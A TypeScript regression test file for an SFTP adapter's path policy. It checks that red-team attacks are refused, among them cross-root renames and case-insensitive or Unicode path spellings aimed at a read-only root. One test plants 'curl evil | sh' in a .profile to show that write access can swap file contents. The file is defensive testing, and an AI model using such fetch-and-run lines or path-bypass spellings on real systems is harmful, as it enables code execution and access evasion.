// The red team's findings on SFTP adapters (2026-11-17, docs/adapter-kinds.md#decisions-for-nicks-review),
// kept as regressions: each attack below worked before its fix and must now be refused.

import { existsSync } from 'node:fs'
import { lstat, mkdir, readFile, rename, unlink, writeFile } from 'node:fs/promises'
import { foldPath, pathAllowed, renameAllowed, type SftpRoot } from '@valet/core/sftp-policy'
import type { FakeSftp, FakeSftpOptions } from '@valet/fake-sftp'
import { utils } from 'ssh2'
import { afterEach, describe, expect, it } from 'vitest'
import { checkRequest } from '../src/sftp/client'
import { MAX_PACKET, PacketReader } from '../src/sftp/wire'
import { fakeSftp, roots, signedIn } from './sftp-helpers'

const { STATUS_CODE } = utils.sftp

let server: FakeSftp | null = null
let close: (() => void) | null = null
afterEach(async () => {
  close?.()
  close = null
  await server?.close()
  server = null
})

describe('F1: a file can’t leave a write root for an irreversible one', () => {
  it('refuses a rename across roots of different access, at every layer', async () => {
    server = await fakeSftp()
    await writeFile(server.at('/inbox/contract.pdf'), 'signed original')
    const s = await signedIn(server, 'irreversible')
    close = s.close
    const r = roots(server)
    expect(renameAllowed('/inbox/contract.pdf', '/scratch/contract.pdf', r)).toBe(false)
    expect(renameAllowed('/scratch/old.txt', '/inbox/old.txt', r)).toBe(false)
    expect(renameAllowed('/inbox/contract.pdf', '/inbox/contract-2.pdf', r)).toBe(true)
    expect(
      checkRequest(
        { type: 'RENAME', from: '/inbox/contract.pdf', to: '/scratch/c.pdf' },
        'irreversible',
        r,
        r,
        new Map(),
      ),
    ).toBe('not-allowed')
    await expect(s.ops.run('rename', ['/inbox/contract.pdf', '/scratch/contract.pdf'])).rejects.toMatchObject(
      {
        failure: 'not-allowed',
      },
    )
    expect(await readFile(server.at('/inbox/contract.pdf'), 'utf8')).toBe('signed original')
    expect(server.requests.some((x) => x.type === 'RENAME')).toBe(false)
  })
})

/**
 * A case-insensitive server (macOS Remote Login on APFS, Windows OpenSSH on NTFS): names match in
 * any case, and OpenSSH's own sftp_realpath returns the spelling it was given (it doesn't correct
 * case). Emulated: any path with an upper-case letter is served from its lower-case spelling.
 */
function caseInsensitive(get: () => FakeSftp): NonNullable<FakeSftpOptions['hostile']> {
  return ({ request, reqid, sftp }) => {
    const p = request.path
    if (p === undefined) return false
    const changed =
      p !== p.toLowerCase() || (request.path2 !== undefined && request.path2 !== request.path2.toLowerCase())
    if (!changed) return false
    const at = (x: string) => get().at(x.toLowerCase())
    const done = (work: Promise<unknown>, answer: () => void) =>
      void work.then(answer, () => sftp.status(reqid, STATUS_CODE.NO_SUCH_FILE))
    switch (request.type) {
      case 'REALPATH':
        done(lstat(at(p)), () => sftp.name(reqid, [{ filename: p, longname: p, attrs: {} as never }]))
        return true
      case 'LSTAT':
      case 'STAT':
        void lstat(at(p)).then(
          (st) => sftp.attrs(reqid, { mode: st.mode, uid: 0, gid: 0, size: st.size, atime: 0, mtime: 0 }),
          () => sftp.status(reqid, STATUS_CODE.NO_SUCH_FILE),
        )
        return true
      case 'REMOVE':
        done(unlink(at(p)), () => sftp.status(reqid, STATUS_CODE.OK))
        return true
      case 'RENAME':
        done(rename(at(p), at(request.path2 as string)), () => sftp.status(reqid, STATUS_CODE.OK))
        return true
      default:
        return false
    }
  }
}

describe('F2: a case-insensitive server can’t reach a nested, narrower root', () => {
  const nested = (): SftpRoot[] => [
    { path: '/scratch', access: 'irreversible' },
    { path: '/scratch/keep', access: 'read' },
  ]

  it('holds REMOVE /scratch/KEEP/precious.txt and a RENAME of the root itself at every layer', () => {
    const r = nested()
    for (const path of [
      '/scratch/KEEP/precious.txt',
      '/scratch/ke\u0065p/x',
      '/scratch/keep./x',
      '/scratch/Ｋeep/x',
    ]) {
      expect(pathAllowed('remove', path, 'irreversible', r)).toBe(false)
      expect(checkRequest({ type: 'REMOVE', path }, 'irreversible', r, r, new Map())).toBe('not-allowed')
    }
    expect(pathAllowed('rename', '/scratch/KEEP', 'write', r)).toBe(false)
    expect(pathAllowed('rename', '/SCRATCH', 'write', r)).toBe(false)
    expect(
      checkRequest(
        { type: 'RENAME', from: '/scratch/KEEP', to: '/scratch/gone' },
        'irreversible',
        r,
        r,
        new Map(),
      ),
    ).toBe('not-allowed')
    // Folding only ever limits: a differently spelt root grants nothing on a server that minds case.
    expect(pathAllowed('stat', '/Scratch/x', 'read', r)).toBe(false)
    expect(pathAllowed('remove', '/scratch/other.txt', 'irreversible', r)).toBe(true)
    expect(foldPath('/A/Café./b ')).toBe(foldPath('/a/cafe\u0301/b'))
  })

  it('end to end: leaves the read root and its files alone', async () => {
    let s0: FakeSftp | null = null
    server = await fakeSftp({ hostile: caseInsensitive(() => s0 as FakeSftp) })
    s0 = server
    await mkdir(server.at('/scratch/keep'), { recursive: true })
    await writeFile(server.at('/scratch/keep/precious.txt'), 'read-only, per the card')
    await writeFile(server.at('/scratch/keep/other.txt'), 'also read-only')
    const s = await signedIn(server, 'irreversible', nested())
    close = s.close

    // The lower-case spellings are refused, as they should be...
    await expect(s.ops.run('remove', ['/scratch/keep/precious.txt'])).rejects.toMatchObject({
      failure: 'not-allowed',
    })
    // ...and so are the upper-case ones.
    await expect(s.ops.run('remove', ['/scratch/KEEP/precious.txt'])).rejects.toMatchObject({
      failure: 'not-allowed',
    })
    await expect(s.ops.run('rename', ['/scratch/KEEP', '/scratch/gone'])).rejects.toMatchObject({
      failure: 'not-allowed',
    })
    expect(existsSync(server.at('/scratch/keep/precious.txt'))).toBe(true)
    expect(existsSync(server.at('/scratch/keep/other.txt'))).toBe(true)
  })
})

// F3 is by design: write access can swap and append, and the card now says so ("append to").
describe('F3: a write-only session can swap a file’s contents, as the card says', () => {
  it('rename the original aside, create a new one under its name, and append to another', async () => {
    server = await fakeSftp()
    await writeFile(server.at('/inbox/.profile'), 'export PATH=/usr/bin\n')
    const s = await signedIn(server, 'write')
    close = s.close
    await s.ops.run('rename', ['/inbox/.profile', '/inbox/.p'])
    await s.ops.run('write', ['/inbox/.profile', 'curl evil | sh\n'])
    await s.ops.run('write', ['/inbox/.p', 'curl evil | sh\n', { mode: 'append' }])
    expect(await readFile(server.at('/inbox/.profile'), 'utf8')).toBe('curl evil | sh\n')
    expect(await readFile(server.at('/inbox/.p'), 'utf8')).toContain('curl evil')
  })
})

describe('F4: a server dripping a packet a few bytes at a time', () => {
  it('costs about what one whole packet does', () => {
    const r = new PacketReader()
    const header = Buffer.alloc(4)
    header.writeUInt32BE(MAX_PACKET)
    r.push(header)
    const chunk = Buffer.alloc(16)
    const start = performance.now()
    let out: Buffer[] = []
    for (let i = 0; i < MAX_PACKET / 16; i++) out = r.push(chunk)
    expect(performance.now() - start).toBeLessThan(150)
    expect(out).toHaveLength(1)
    expect(out[0]?.length).toBe(MAX_PACKET)
  })
})
